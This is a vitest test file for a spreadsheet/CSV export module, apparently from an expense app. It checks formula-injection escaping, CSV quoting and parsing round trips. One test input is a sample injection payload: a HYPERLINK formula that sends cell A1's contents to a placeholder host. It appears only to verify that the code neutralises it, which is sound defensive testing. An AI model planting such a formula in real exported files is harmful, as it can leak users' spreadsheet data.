import { describe, expect, it } from "vitest";

import {
  csvField,
  csvRow,
  csvRowEscaped,
  escapeFormula,
  parseCsv,
  startsFormula,
  unescapeFormula,
} from "./spreadsheet.js";

/**
 * These two rules are the ones that are expensive to get wrong: a formula that
 * executes when somebody opens the file, and a round trip that corrupts the
 * data it was supposed to preserve.
 */
describe("formula injection", () => {
  it("recognises every character that starts a formula", () => {
    for (const trigger of ["=", "+", "-", "@", "\t", "\r"]) {
      expect(startsFormula(`${trigger}SUM(A1)`)).toBe(true);
    }
  });

  it("leaves ordinary text alone", () => {
    expect(startsFormula("午饭")).toBe(false);
    expect(startsFormula("2 人餐")).toBe(false);
    expect(startsFormula("")).toBe(false);
  });

  it("neutralises an obvious attack", () => {
    const attack = '=HYPERLINK("http://example.invalid/?x="&A1,"点我")';
    expect(escapeFormula(attack)).toBe(`'${attack}`);
  });

  it("neutralises every trigger, not just the equals sign", () => {
    expect(escapeFormula("+1")).toBe("'+1");
    expect(escapeFormula("-1")).toBe("'-1");
    expect(escapeFormula("@SUM")).toBe("'@SUM");
    expect(escapeFormula("\tcmd")).toBe("'\tcmd");
  });

  it("survives a round trip without growing an apostrophe each time", () => {
    const note = "=1+1";
    const once = unescapeFormula(escapeFormula(note));
    const twice = unescapeFormula(escapeFormula(once));
    const thrice = unescapeFormula(escapeFormula(twice));

    expect(once).toBe(note);
    expect(twice).toBe(note);
    expect(thrice).toBe(note);
  });

  it("keeps an apostrophe the user actually typed", () => {
    // "'quoted'" does not begin with a formula character after the apostrophe,
    // so the apostrophe is the user's own and must not be removed.
    expect(unescapeFormula("'quoted'")).toBe("'quoted'");
  });

  it("removes only one layer", () => {
    expect(unescapeFormula("'=1")).toBe("=1");
    expect(unescapeFormula("=1")).toBe("=1");
  });
});

describe("csvField", () => {
  it("quotes a field containing a comma", () => {
    expect(csvField("午饭, 晚饭")).toBe('"午饭, 晚饭"');
  });

  it("doubles an embedded quote", () => {
    expect(csvField('他说"好"')).toBe('"他说""好"""');
  });

  it("quotes a field containing a newline rather than breaking the row", () => {
    expect(csvField("第一行\n第二行")).toBe('"第一行\n第二行"');
  });

  it("leaves a plain field unwrapped", () => {
    expect(csvField("餐饮")).toBe("餐饮");
  });

  it("writes numbers without quotes, so a spreadsheet reads them as numbers", () => {
    expect(csvField(1234)).toBe("1234");
  });

  it("does NOT escape a negative number, which would turn it into text", () => {
    // The correction that mattered: escaping here made every expense export as
    // '-38.5, and a column of text cannot be summed.
    expect(csvField(-38.5)).toBe("-38.5");
    expect(csvField(-10)).toBe("-10");
  });

  it("writes null and undefined as empty, not as the word", () => {
    expect(csvField(null)).toBe("");
    expect(csvField(undefined)).toBe("");
  });

  it("leaves formula escaping to the caller that knows the column", () => {
    expect(csvField("=1+1")).toBe("=1+1");
  });
});

describe("csvRowEscaped", () => {
  it("escapes only the columns named as text", () => {
    // Columns: 0 = date, 1 = amount, 2 = note.
    const row = csvRowEscaped(["2026-10-10", -38.5, "=1+1"], [2]);

    expect(row).toBe("2026-10-10,-38.5,'=1+1");
  });

  it("leaves a negative amount alone even when it sits next to escaped text", () => {
    const row = csvRowEscaped(["-38.5", "=SUM(A1)"], [1]);
    expect(row).toBe("-38.5,'=SUM(A1)");
  });

  it("still quotes text that needs it", () => {
    expect(csvRowEscaped(["午饭, 晚饭"], [0])).toBe('"午饭, 晚饭"');
  });
});

describe("csvRow", () => {
  it("joins with commas", () => {
    expect(csvRow(["2026-10-10", "12:00", "支出"])).toBe("2026-10-10,12:00,支出");
  });
});

describe("parseCsv", () => {
  it("reads a plain file", () => {
    expect(parseCsv("a,b\n1,2\n")).toEqual([
      ["a", "b"],
      ["1", "2"],
    ]);
  });

  it("accepts CRLF, which is what Excel writes", () => {
    expect(parseCsv("a,b\r\n1,2\r\n")).toEqual([
      ["a", "b"],
      ["1", "2"],
    ]);
  });

  it("strips a byte-order mark, which we ourselves write", () => {
    expect(parseCsv("\uFEFF日期,金额\n2026-10-10,12.34")).toEqual([
      ["日期", "金额"],
      ["2026-10-10", "12.34"],
    ]);
  });

  it("keeps a comma inside quotes", () => {
    expect(parseCsv('a\n"午饭, 晚饭"')).toEqual([["a"], ["午饭, 晚饭"]]);
  });

  it("keeps a newline inside quotes", () => {
    expect(parseCsv('a\n"第一行\n第二行"\nb')).toEqual([["a"], ["第一行\n第二行"], ["b"]]);
  });

  it("unescapes doubled quotes", () => {
    expect(parseCsv('"他说""好"""')).toEqual([['他说"好"']]);
  });

  it("keeps empty fields, which are real values here", () => {
    expect(parseCsv("a,,c\n,,")).toEqual([
      ["a", "", "c"],
      ["", "", ""],
    ]);
  });

  it("does not invent a row for a trailing newline", () => {
    expect(parseCsv("a,b\n")).toHaveLength(1);
  });

  it("reads a last row with no trailing newline", () => {
    expect(parseCsv("a,b\n1,2")).toEqual([
      ["a", "b"],
      ["1", "2"],
    ]);
  });

  it("round-trips everything csvRowEscaped writes, byte for byte", () => {
    // The CSV layer's contract is *structural*: quotes, commas and newlines come
    // back exactly. Escaping is applied to the columns the caller names, and
    // unescaping is the importer's job — mixing the two here is what an earlier
    // version of this test got wrong.
    const rows = [
      ["日期", "金额", "备注"],
      ["2026-10-10", "12.34", "午饭, 晚饭"],
      ["2026-10-11", "5.00", '他说"好"'],
      ["2026-10-12", "1.00", "第一行\n第二行"],
      ["2026-10-13", "0.00", "=1+1"],
    ];

    const text = rows.map((row) => csvRowEscaped(row, [2])).join("\r\n");
    const escaped = rows.map((row) => [row[0], row[1], escapeFormula(row[2] ?? "")]);
    expect(parseCsv(text)).toEqual(escaped);
  });

  it("recovers the original text once the importer unescapes", () => {
    const original = "=1+1";
    const written = csvRowEscaped(["2026-10-13", "0.00", original], [2]);
    const parsed = parseCsv(written);

    expect(parsed[0]?.[2]).toBe(`'${original}`);
    expect(unescapeFormula(parsed[0]?.[2] ?? "")).toBe(original);
  });
});
